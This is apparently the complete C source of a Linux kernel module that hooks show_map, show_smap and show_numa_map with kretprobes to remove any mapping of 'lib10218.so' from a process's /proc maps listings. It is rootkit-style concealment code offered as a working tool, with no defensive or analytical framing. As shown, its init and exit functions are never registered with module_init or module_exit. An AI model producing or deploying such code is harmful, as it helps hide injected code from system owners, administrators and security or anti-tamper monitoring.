#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

#if !defined(__nocfi)
#define __nocfi __attribute__((no_sanitize("cfi")))
#endif


static char target_so_name[128] = "lib10218.so";


struct maps_hide_data {
    struct seq_file *m;
    size_t saved_count;
    bool hit;
};

static bool vma_matches_target(struct vm_area_struct *vma)
{
    struct file *file;
    char buf[256];
    char *path;

    if (!vma)
        return false;

    file = vma->vm_file;
    if (!file)
        return false;

    path = d_path(&file->f_path, buf, sizeof(buf));
    if (IS_ERR(path))
        return false;

    return strstr(path, target_so_name) != NULL;
}


static int __nocfi hide_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct maps_hide_data *d = (void *)ri->data;
    struct seq_file *m = (struct seq_file *)regs->regs[0];
    struct vm_area_struct *vma = (struct vm_area_struct *)regs->regs[1];

    d->m = m;
    d->saved_count = m->count;
    d->hit = vma_matches_target(vma);

    return 0;
}

static int __nocfi hide_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct maps_hide_data *d = (void *)ri->data;

    if (d->hit && d->m) {
        d->m->count = d->saved_count;
    }

    return 0;
}



static struct kretprobe krp_show_map = {
    .handler       = hide_ret,
    .entry_handler = hide_entry,
    .data_size     = sizeof(struct maps_hide_data),
    .maxactive     = 20,
    .kp.symbol_name = "show_map",
};

static struct kretprobe krp_show_smap = {
    .handler       = hide_ret,
    .entry_handler = hide_entry,
    .data_size     = sizeof(struct maps_hide_data),
    .maxactive     = 20,
    .kp.symbol_name = "show_smap",
};

static struct kretprobe krp_show_numa_map = {
    .handler       = hide_ret,
    .entry_handler = hide_entry,
    .data_size     = sizeof(struct maps_hide_data),
    .maxactive     = 20,
    .kp.symbol_name = "show_numa_map",
};


static int hide_so_init(void)
{
    int ret;

    ret = register_kretprobe(&krp_show_map);
    if (ret < 0) {
        pr_err("hide_so: show_map hook failed: %d\n", ret);
        return ret;
    }

    ret = register_kretprobe(&krp_show_smap);
    if (ret < 0) {
        pr_err("hide_so: show_smap hook failed: %d\n", ret);
        goto err_smap;
    }

    ret = register_kretprobe(&krp_show_numa_map);
    if (ret < 0) {
        pr_warn("hide_so: show_numa_map hook failed: %d (ignored)\n", ret);
        krp_show_numa_map.kp.addr = NULL;
    }

    pr_info("hide_so: hooks installed, hiding '%s'\n", target_so_name);
    return 0;

err_smap:
    unregister_kretprobe(&krp_show_map);
    return ret;
}

static void hide_so_exit(void)
{
    if (krp_show_numa_map.kp.addr)
        unregister_kretprobe(&krp_show_numa_map);
    unregister_kretprobe(&krp_show_smap);
    unregister_kretprobe(&krp_show_map);
    pr_info("hide_so: hooks removed\n");
}

